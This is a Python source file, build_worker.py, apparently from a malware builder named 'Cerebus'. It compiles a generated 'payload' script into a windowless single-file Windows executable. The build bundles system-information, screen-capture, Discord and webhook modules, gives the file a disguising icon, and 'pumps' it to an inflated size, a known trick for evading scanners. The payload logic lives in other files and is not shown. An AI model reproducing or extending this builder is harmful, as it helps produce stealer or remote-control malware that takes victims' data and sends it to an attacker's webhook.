# F:/Cerebus/build_worker.py
import os
import sys
import subprocess
import shutil
import time # Ensure time is imported if used for pump_duration (it is)
import traceback # Ensure traceback is imported

from PyQt6.QtCore import QObject, pyqtSignal

# Assuming file_utils.py is in the same directory or accessible in PYTHONPATH
try:
    import file_utils # For pump_file and generate_payload_script_content
except ImportError:
    print("CRITICAL ERROR in build_worker.py: Could not import file_utils.py")
    # This is a hard dependency, if it can't be imported, BuildWorker is useless.
    # In a real app, might raise an exception or handle more gracefully.
    file_utils = None 


class BuildWorker(QObject):
    progress = pyqtSignal(int)
    status = pyqtSignal(str)
    finished_signal = pyqtSignal(bool, str, str) 

    def __init__(self, config):
        super().__init__()
        self.config = config
        python_dir = os.path.dirname(sys.executable)
        pyinstaller_script = 'pyinstaller.exe' if sys.platform == "win32" else 'pyinstaller'
        local_pyinstaller = os.path.join(python_dir, 'Scripts', pyinstaller_script)
        if not os.path.exists(local_pyinstaller):
            local_pyinstaller = os.path.join(python_dir, pyinstaller_script)
        
        if os.path.exists(local_pyinstaller):
            self.pyinstaller_path = local_pyinstaller
        else:
            self.pyinstaller_path = "pyinstaller" # Fallback to PATH

    def run(self):
        if not file_utils: # Check if import failed
            self.finished_signal.emit(False, "Build Failed: Critical internal dependency 'file_utils' missing.", "")
            return

        self.status.emit("Build process initiated...")
        self.progress.emit(5)
        output_dir = os.path.join(self.config['project_root'], "dist")
        final_exe_name = self.config['output_name']
        payload_script_name = "payload_script_temp.py"
        payload_script_path = os.path.join(self.config['project_root'], payload_script_name)
        os.makedirs(output_dir, exist_ok=True)
        try:
            self.status.emit("Generating payload script (this includes live mode logic if enabled)...")
            script_content = file_utils.generate_payload_script_content(self.config)
            if "Critical Error:" in script_content and "Webhook URL" in script_content : 
                self.finished_signal.emit(False, "Build Failed: Critical error in script generation (e.g., Webhook URL).", "")
                return

            with open(payload_script_path, "w", encoding='utf-8') as f: f.write(script_content)
            self.progress.emit(15); self.status.emit("Payload script generated.")
            self.status.emit(f"Preparing to compile '{final_exe_name}'...")
            icon_path_for_pyi = self.config.get('payload_icon') # Use .get() for safety
            icon_option = []
            if icon_path_for_pyi and isinstance(icon_path_for_pyi, str) and os.path.exists(icon_path_for_pyi):
                icon_path_abs = os.path.abspath(icon_path_for_pyi)
                icon_option = [f"--icon={icon_path_abs}"]
                self.status.emit(f"Using icon: {os.path.basename(icon_path_for_pyi)}")
            elif icon_path_for_pyi: # Path was provided but might be invalid or not found
                 self.status.emit(f"Warning: Requested icon '{os.path.basename(str(icon_path_for_pyi))}' not found or invalid.")
                 self.status.emit("Using PyInstaller default icon.")
            else: # No icon path provided
                 self.status.emit("Using PyInstaller default icon.")

            system_info_abs = os.path.abspath(os.path.join(self.config['project_root'], 'system_info.py'))
            webhook_utils_abs = os.path.abspath(os.path.join(self.config['project_root'], 'webhook_utils.py'))
            live_components_dir_abs = os.path.abspath(os.path.join(self.config['project_root'], 'live_payload_components'))

            cmd = [
                self.pyinstaller_path, '--noconfirm', '--onefile', '--windowed', '--strip',
                "--distpath", output_dir, "--workpath", os.path.join(self.config['project_root'], "build"),
                "--specpath", self.config['project_root'],
                "--name", os.path.splitext(final_exe_name)[0],
                "--hidden-import=requests", "--hidden-import=psutil", 
                "--hidden-import=pywintypes", "--hidden-import=wmi", "--hidden-import=uuid",
                "--hidden-import=ctypes", "--hidden-import=discord", "--hidden-import=discord.state", 
                "--hidden-import=discord.utils", "--hidden-import=aiohttp",      
                "--hidden-import=async_timeout", "--hidden-import=mss",   
                f"--add-data={system_info_abs}{os.pathsep}.", 
                f"--add-data={webhook_utils_abs}{os.pathsep}.",
                f"--add-data={live_components_dir_abs}{os.pathsep}live_payload_components",
            ]
            cmd.extend(icon_option)
            cmd.append(payload_script_path)

            self.status.emit(f"Using PyInstaller: {self.pyinstaller_path}")
            self.status.emit(f"PyInstaller Command: {' '.join(cmd)}")
            self.progress.emit(20); self.status.emit("PyInstaller process starting...")
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                       creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                                       cwd=self.config['project_root'])
            timeout_seconds = 300; stdout_data, stderr_data, proc_return_code = "", "", -1
            try:
                self.status.emit(f"Waiting for PyInstaller (timeout: {timeout_seconds}s)...")
                stdout_data, stderr_data = process.communicate(timeout=timeout_seconds)
                proc_return_code = process.returncode
                self.status.emit(f"PyInstaller finished (code: {proc_return_code})"); self.progress.emit(75)
            except subprocess.TimeoutExpired:
                self.status.emit(f"PyInstaller timed out after {timeout_seconds}s. Terminating."); process.kill()
                try: stdout_data, stderr_data = process.communicate(timeout=5)
                except Exception: pass
                self.progress.emit(75); self.finished_signal.emit(False, "Build Failed: PyInstaller timed out.", ""); return
            except Exception as e_comm:
                self.status.emit(f"Error communicating with PyInstaller: {e_comm}");
                if process.poll() is None: process.kill()
                try: stdout_data, stderr_data = process.communicate(timeout=5)
                except Exception: pass
                self.progress.emit(75); self.finished_signal.emit(False, f"Build Failed: PyInstaller communication: {e_comm}", ""); return
            
            if stdout_data and stdout_data.strip(): self.status.emit(f"PyI Stdout (last 1k):\n...{stdout_data.strip()[-1000:]}")
            if stderr_data and stderr_data.strip(): self.status.emit(f"PyI Stderr (last 1k):\n...{stderr_data.strip()[-1000:]}")
            
            if proc_return_code != 0:
                self.finished_signal.emit(False, f"PyInstaller failed (Code: {proc_return_code}). Check logs.", ""); return
            self.status.emit("PyInstaller compilation successful.")
            
            pyi_generated_exe_path = os.path.join(output_dir, final_exe_name); actual_built_exe_path = ""
            if os.path.exists(pyi_generated_exe_path): 
                actual_built_exe_path = pyi_generated_exe_path
            else:
                script_base_exe = f"{os.path.splitext(payload_script_name)[0]}.exe"
                fallback_path = os.path.join(output_dir, script_base_exe)
                if os.path.exists(fallback_path):
                    self.status.emit(f"Warning: EXE found as '{script_base_exe}', expected '{final_exe_name}'. Attempting rename.")
                    try:
                        if os.path.exists(pyi_generated_exe_path): os.remove(pyi_generated_exe_path)
                        shutil.move(fallback_path, pyi_generated_exe_path); actual_built_exe_path = pyi_generated_exe_path
                        self.status.emit("Rename successful.")
                    except Exception as e_rename: 
                        self.status.emit(f"Rename failed: {e_rename}. Using '{script_base_exe}'."); actual_built_exe_path = fallback_path
                else: 
                    self.finished_signal.emit(False, f"Build Error: Output EXE '{final_exe_name}' or '{script_base_exe}' not found in dist/.", ""); return
            
            if not actual_built_exe_path:
                self.finished_signal.emit(False, "Build Error: Final executable path could not be determined.", ""); return

            self.status.emit(f"Executable found: {os.path.basename(actual_built_exe_path)}"); self.progress.emit(85)
            
            if self.config.get('pump_size_mb', 0) > 0: # Use .get() for safety
                self.status.emit(f"Pumping '{os.path.basename(actual_built_exe_path)}' to {self.config['pump_size_mb']}MB...")
                pump_ok = file_utils.pump_file(actual_built_exe_path, self.config['pump_size_mb'])
                final_size_mb = os.path.getsize(actual_built_exe_path)/(1024*1024)
                if not pump_ok and final_size_mb < (self.config['pump_size_mb'] * 0.95):
                    self.status.emit(f"Warning: Pumping failed. Final size: {final_size_mb:.2f}MB.")
                else: 
                    self.status.emit(f"Pumping completed. Final size: {final_size_mb:.2f}MB.")
            else: 
                self.status.emit("Pumping skipped (target size 0 MB).")
            
            self.progress.emit(95); self.status.emit("Cleaning up temporary build files...");
            try:
                if os.path.exists(payload_script_path): os.remove(payload_script_path)
                spec_file = os.path.join(self.config['project_root'], f"{os.path.splitext(final_exe_name)[0]}.spec")
                if os.path.exists(spec_file): os.remove(spec_file)
                build_dir_path = os.path.join(self.config['project_root'], "build")
                if os.path.exists(build_dir_path) and os.path.isdir(build_dir_path): shutil.rmtree(build_dir_path, ignore_errors=True)
            except Exception as e_clean: self.status.emit(f"Warning: Cleanup error: {e_clean}")
            
            self.progress.emit(100); self.finished_signal.emit(True, "Build successful!", actual_built_exe_path)
        except Exception as e:
            self.status.emit(f"CRITICAL BUILD ERROR: {e}"); traceback.print_exc()
            self.finished_signal.emit(False, f"Critical Build Error: {e}\n{traceback.format_exc()}", "")
        finally:
            if os.path.exists(payload_script_path) and payload_script_name == "payload_script_temp.py":
                try: os.remove(payload_script_path)
                except OSError: pass # File might be locked briefly by PyInstaller cleanup
                except Exception: pass